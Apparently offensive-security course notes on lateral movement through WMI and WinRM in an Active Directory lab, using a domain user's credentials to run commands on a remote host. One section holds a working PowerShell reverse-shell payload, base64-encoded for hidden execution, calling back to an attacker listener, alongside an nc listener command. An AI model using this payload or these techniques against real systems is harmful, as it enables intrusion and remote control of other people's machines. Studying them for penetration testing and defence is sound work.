## Overview

This note covers two Windows remote management technologies that can be used for lateral movement in Active Directory environments:

```text
WMI
WinRM
```

Both allow a user to run commands on a remote Windows host if they have the required permissions.

The basic idea is:

```text
Valid domain credentials
+
Remote management protocol
+
Local admin or remote management rights on target
=
Remote command execution
```

---

# Big Picture

## What Are We Trying To Do?

We are on one machine:

```text
CLIENT74
```

We want to execute commands on another machine:

```text
FILES04
192.168.50.73
```

We have credentials for:

```text
corp\jen
Password: Nexus123!
```

Important condition:

```text
jen is a local administrator on FILES04
```

Because `jen` is allowed to administer the target, we can use WMI or WinRM to run commands remotely as `jen`.

# Simple Mental Model

## WMI

Think of WMI as:

```text
Remote Windows administration through RPC
```

WMI can tell a remote machine:

```text
Create this process for me.
```

Example:

```text
Start calc.exe on FILES04
```

---

## WinRM

Think of WinRM as:

```text
Remote PowerShell / remote command execution over HTTP(S)
```

WinRM can give you:

```text
one command execution
or
an interactive PowerShell session
```

Example:

```text
Run hostname and whoami on FILES04
```

---

# WMI vs WinRM

| Feature | WMI | WinRM |
|---|---|---|
| Main purpose | Windows management and automation | Remote command execution / PowerShell remoting |
| Common ports | TCP 135 + high RPC ports | TCP 5985 / 5986 |
| Common tools | `wmic`, CIM cmdlets | `winrs`, PowerShell remoting |
| Required access | Local admin on target | Admin or Remote Management Users |
| Session type | Process creation | Remote shell/session |
| Protocol style | RPC/DCOM | HTTP(S) WS-Management |

---

# Required Access

## WMI Requirements

To create a remote process with WMI, you usually need:

```text
credentials for a user in the local Administrators group on the target
```

This can be:

```text
local administrator
domain user who is local admin on target
domain admin
```

Example:

```text
corp\jen is local admin on FILES04
```

---

## WinRM Requirements

To use WinRM, the user usually needs to be in one of these groups on the target:

```text
Administrators
Remote Management Users
```

Example:

```text
corp\jen can use WinRM on FILES04
```

# Important Note About UAC Remote Restrictions

UAC remote restrictions can affect local accounts on non-domain-joined systems.

However, in this lesson:

```text
jen is a domain user
```

The note states that this restriction does not apply in the same way to domain users for the shown lateral movement techniques.

Practical takeaway:

```text
A domain user who is local admin on the target can usually use these methods with full remote privileges.
```

# Part 1 – WMI Lateral Movement

## What WMI Does Here

WMI uses the `Win32_Process` class.

The method we care about is:

```text
Create
```

This lets us tell the remote machine:

```text
Create a new process.
```

Simple example:

```text
Run calc.exe on FILES04.
```

Real attack example:

```text
Run a PowerShell payload on FILES04.
```

---

# WMI Method 1 – wmic

## Basic Syntax

```cmd
wmic /node:<target> /user:<user> /password:<password> process call create "<command>"
```

Meaning:

| Part | Meaning |
|---|---|
| `/node:` | Target machine |
| `/user:` | Username to authenticate as |
| `/password:` | Password for that user |
| `process call create` | Create a process remotely |
| `"<command>"` | Command to run on target |

---

## Example – Launch Calculator

Run from CLIENT74 as `jeff`:

```cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

Expected output:

```text
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 5772;
        ReturnValue = 0;
};
```

Interpretation:

```text
WMI successfully created the process on FILES04.
ReturnValue = 0 means success.
```

---

## Why You May Not See a Window

WMI-created processes run in:

```text
Session 0
```

Why:

```text
WMI Provider Host runs as a system service.
Services run in Session 0.
```

This means GUI programs like Calculator may start, but not appear on the interactive user’s desktop.

Practical takeaway:

```text
Use command output, process lists, or callbacks to verify execution.
Do not rely on seeing a GUI window.
```

# WMI Method 2 – PowerShell CIM

The PowerShell version does the same thing as `wmic`, but with modern PowerShell cmdlets.

The flow is:

```text
1. Store username and password.
2. Convert password to SecureString.
3. Create PSCredential object.
4. Create CIM session to target.
5. Define command.
6. Invoke Win32_Process.Create remotely.
```

---

## Step 1 – Create Credential Object

```powershell
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
```

Plain English:

```text
PowerShell needs credentials in a PSCredential object.
The password must be converted into a SecureString first.
```

---

## Step 2 – Create CIM Session

```powershell
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options
```

Plain English:

```text
Create a remote management session to FILES04 using DCOM/WMI.
```

Why DCOM?

```text
WMI uses DCOM/RPC for this style of remote management.
```

---

## Step 3 – Define Command

```powershell
$command = 'calc'
```

This is the command that will run on the target.

---

## Step 4 – Run Remote Process

```powershell
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command}
```

Plain English:

```text
Ask the remote Win32_Process class to create a process using the command line we supplied.
```

---

## Example Output

```text
ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3712           0 192.168.50.73
```

Interpretation:

```text
ProcessId = PID of created process
ReturnValue = 0 means success
PSComputerName = target host
```

# WMI With PowerShell Payload

## Why Encode the Payload?

PowerShell payloads often contain characters that are annoying to escape inside command strings.

Encoding the payload avoids problems with:

```text
quotes
semicolons
pipes
special characters
spaces
PowerShell parsing
```

The payload becomes:

```text
powershell -nop -w hidden -e <base64>
```

---

## Python Encoder

Edit the IP and port for your Kali listener.

```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

Run it:

```bash
python3 encode.py
```

Output format:

```text
powershell -nop -w hidden -e <base64_payload>
```

On Kali:

```bash
nc -lnvp 443
```

# WinRM Method 2 – PowerShell Remoting

PowerShell Remoting uses WinRM.

The basic flow is:

```text
1. Create PSCredential object.
2. Create a new remote PowerShell session.
3. Enter the session.
4. Run commands on the target.
```

---

## Step 1 – Create Credential Object

```powershell
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
```

---

## Step 2 – Create Remote Session

```powershell
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
```

Example output:

```text
Id Name            ComputerName    ComputerType    State   ConfigurationName     Availability
-- ----            ------------    ------------    -----   -----------------     ------------
1  WinRM1          192.168.50.73   RemoteMachine   Opened  Microsoft.PowerShell  Available
```

Important value:

```text
Id: 1
```

---

## Step 3 – Enter the Session

```powershell
Enter-PSSession 1
```

Prompt changes to:

```text
[192.168.50.73]: PS C:\Users\jen\Documents>
```

This means:

```text
you are now running commands on the remote host
```

---

## Step 4 – Confirm Remote Context

```powershell
whoami
hostname
```

Expected output:

```text
corp\jen
FILES04
```

Interpretation:

```text
PowerShell Remoting session is active on FILES04 as corp\jen.
```

# Decision Tree

## Do I have local admin on the target?

If yes:

```text
Try WMI.
Try WinRM if enabled.
```

If no:

```text
Check if the user is in Remote Management Users.
Check other lateral movement paths.
```

---

## Is WinRM open?

Check ports:

```text
5985
5986
```

If open:

```text
try winrs
try New-PSSession
```

---

## Is WMI/RPC reachable?

Check ports:

```text
135
high RPC ports
```

If reachable and credentials are local admin:

```text
try wmic or CIM
```

---

## Do I need one command or an interactive shell?

One command:

```text
wmic
Invoke-CimMethod
winrs
```

Interactive session:

```text
Enter-PSSession
reverse shell payload
```

# Common Success Indicators

| Output | Meaning |
|---|---|
| `ReturnValue = 0` | WMI process creation succeeded |
| `ProcessId = <number>` | Remote process was created |
| `FILES04` from `hostname` | Command ran on target |
| `corp\jen` from `whoami` | Command ran as jen |
| `New-PSSession` state `Opened` | WinRM session created |
| PowerShell prompt changes to `[target]:` | Entered remote session |
| Reverse callback from target IP | Payload executed on target |

# Common Failure Causes

## WMI Fails

Possible causes:

```text
user is not local admin on target
RPC blocked
TCP 135 blocked
dynamic RPC ports blocked
wrong credentials
target firewall blocks WMI
WMI service issues
AV/EDR blocks command
```

---

## WinRM Fails

Possible causes:

```text
WinRM not enabled
TCP 5985/5986 blocked
user not in Administrators or Remote Management Users
wrong credentials
PowerShell remoting disabled
authentication issue
firewall blocks WinRM
```

---

## Payload Runs But No Callback

Possible causes:

```text
wrong Kali IP
wrong listener port
egress blocked
PowerShell blocked
payload encoded incorrectly
AV/EDR blocked payload
Windows Defender blocked execution
network routing issue
```

# Key Takeaways

- WMI and WinRM are legitimate Windows management technologies.
- Both can be used for lateral movement when credentials have enough rights.
- WMI can create remote processes through `Win32_Process.Create`.
- WMI commonly uses TCP 135 and dynamic RPC ports.
- `wmic` is older and deprecated, but useful for understanding the technique.
- PowerShell CIM cmdlets can perform the same WMI process creation.
- WinRM uses TCP 5985 for HTTP and TCP 5986 for HTTPS.
- `winrs` can execute remote commands over WinRM.
- PowerShell Remoting can create interactive WinRM sessions.
- `ReturnValue = 0` means WMI process creation succeeded.
- Always verify remote context with `hostname` and `whoami`.
- In this lab, `jen` can move laterally to FILES04 because she has the required rights.
- WMI and WinRM activity can be detected through process, network, and PowerShell telemetry.
